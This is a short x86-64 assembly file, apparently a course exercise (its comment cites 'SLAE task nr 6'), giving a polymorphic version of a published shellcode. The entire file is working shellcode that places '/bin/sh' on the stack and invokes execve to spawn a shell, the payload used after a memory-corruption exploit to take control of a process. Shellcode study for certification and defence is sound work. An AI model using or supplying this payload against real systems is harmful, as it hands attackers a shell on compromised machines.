; Original shellcode: http://shell-storm.org/shellcode/files/shellcode-603.php 
; This is the polymorphic version of the original shellcode, for the SLAE task nr 6

section .text
global _start
 
_start:
            xor     rdx, rdx
            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8
            mov     rcx, rbx
            push    rcx
            mov     rdi, rsp
            push    rdx

            sub     rsp, 8
            mov     [rsp], rdi
            ;push    rdi

            mov     rsi, rsp
            xor     rax, rax
            mov     al, 0x3b
            syscall

